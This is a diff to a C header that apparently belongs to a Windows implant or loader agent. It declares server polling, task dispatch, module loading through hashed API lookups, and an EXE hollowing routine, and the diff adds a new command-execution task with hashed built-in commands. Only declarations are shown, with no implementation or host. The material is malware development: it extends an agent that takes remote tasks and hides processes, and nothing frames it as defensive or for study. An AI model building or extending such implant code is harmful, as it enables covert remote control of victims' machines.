@@ -1,6 +1,7 @@
 #pragma once
 
 #include "../core/core.h"
+#include "../parser/parser.h"
 
 
 
@@ -25,6 +26,7 @@ typedef struct _LdrTask {
 
 #define TASK_LOAD 0x1
 #define TASK_MODULE 0x3
+#define TASK_CMD 0x5
 #define TASK_NO_TASK 0xff
 
 #define MSG_GET_FILE    0xab
@@ -32,6 +34,16 @@ typedef struct _LdrTask {
 #define MSG_OUTPUT      0xad
 #define MSG_NEEDS_PARSE 0xaf
 #define CODE_REGISTER   0xab
+
+// Output types (first 4 bytes of an output payload). Module outputs (LS/CAT) are
+// declared per-module; this one is emitted by the agent for tasks that launch
+// something and have no payload to return.
+#define OUTPUT_TEXT     0x01
+#define OUTPUT_NO_DATA  0x04
+
+// Built-in command names, hashed with the agent's djb2 (HashStringA).
+#define HASHED_BUILTIN_CD   0x0059776c
+#define HASHED_BUILTIN_PWD  0x0b889f10
 
 #define NT_SUCCESS(Status) ((NTSTATUS)(Status) >= 0)
 
@@ -48,6 +60,8 @@ typedef struct _Module {
 	FARPROC (WINAPI *ModuleGetProc)(HMODULE mod, DWORD hash);
 	HMODULE (WINAPI *ModuleLoadLibraryA)(PCHAR name);
 	BOOL    (WINAPI *ModuleFreeLibrary)(HMODULE mod);
+	PVOID   (WINAPI *ModuleAllocate)(DWORD Size);
+	void    (WINAPI *ModuleFree)(HLOCAL mem);
 } Module, *pModule;
 
 typedef BOOL (WINAPI* pModuleEntry)(pModule api, PVOID ctx, PBYTE args, DWORD ArgLen);
@@ -65,8 +79,10 @@ typedef BOOL (WINAPI* pModuleEntry)(pModule api, PVOID ctx, PBYTE args, DWORD Ar
 LdrTask LdrPullFile();
 void LdrInitPoll();
 LdrTask LdrPollServer();
-BOOL LdrLoadAndRun(LdrTask info, BOOL CleanUpAfter);
-BOOL LdrRunModule(LdrTask info, BOOL CleanUpAfter);
+void LdrBeginOutput(ParserWrite *p, DWORD taskId);
+BOOL LdrLoadAndRun(LdrTask info, ParserWrite *p);
+BOOL LdrRunModule(LdrTask info, ParserWrite *p);
+BOOL LdrRunCmd(LdrTask info, ParserWrite *p);
 BOOL LdrRunExe(LdrTask info);
 BOOL LdrHollowExe(LdrTask info);
 
